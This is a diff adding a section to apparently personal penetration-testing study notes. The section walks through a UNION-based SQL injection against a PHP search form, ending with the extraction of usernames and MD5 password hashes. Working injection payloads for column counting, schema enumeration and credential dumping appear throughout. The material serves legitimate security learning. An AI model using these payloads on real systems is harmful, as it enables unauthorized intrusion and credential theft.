@@ -1602,3 +1602,52 @@ Vulnerable SQL Query
 ```php
 $query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
 ```
+![image](https://hackmd.io/_uploads/HJgV5gU4Xye.png)
+> click SEARCH to retrieve all data from the customers table
+
+>[!Note]
+we need to know the exact number of columns present in the target table.
+
+1. Verifying the exact number of columns
+```
+' ORDER BY 1-- //
+' ORDER BY 2-- //
+...
+' ORDER BY 6-- //
+```
+![image](https://hackmd.io/_uploads/H1_QWUVmye.png)
+> we'll discover that the table has `five columns` since ordering by **column six returns an error**. 
+            
+2. Attempt our first attack            
+```
+%' UNION SELECT database(), user(), @@version, null, null -- //
+```
+> (1) %' 來閉合 search parameter
+> (2) 配合 UNION SELECT
+> (3) dumps the current database name, the user, and the MySQL version in the first, second, and third columns, respectively, leaving the remaining two null.
+            
+![image](https://hackmd.io/_uploads/ryMzXUEmyx.png)
+> `username` and the `DB version` are present on the last line, but the current database name is not.
+> `column 1` is typically reserved for the `ID field` consisting of an integer data type, **cannot return the string value**.
+>> So... shifting all the enumerating functions
+            
+```
+' UNION SELECT null, null, database(), user(), @@version  -- //
+```
+![image](https://hackmd.io/_uploads/BybRILV7Je.png)
+
+3. Verify whether other tables are present in the current database
+retrieve the columns table from the `information_schema database` belonging to the current database
+```
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+```
+![image](https://hackmd.io/_uploads/SkinoLNXJl.png)
+> the three columns contain the `table name`, the `column name`, and the `current database`, respectively
+>> Also... new table named **"users"** that contains four columns, including one named password.
+
+```
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+![image](https://hackmd.io/_uploads/SkugTUV7ke.png)
+> fetch the usernames and **MD5 hashes** of the entire users table
+
